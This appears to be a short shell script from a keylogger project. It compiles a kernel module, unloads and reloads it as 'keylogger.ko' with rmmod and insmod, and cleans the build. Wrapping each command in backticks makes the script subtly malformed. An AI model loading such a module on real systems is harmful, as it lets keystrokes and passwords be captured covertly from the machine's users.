#!/bin/sh
`make all`
`rmmod keylogger`
`insmod keylogger.ko`
`make clean`
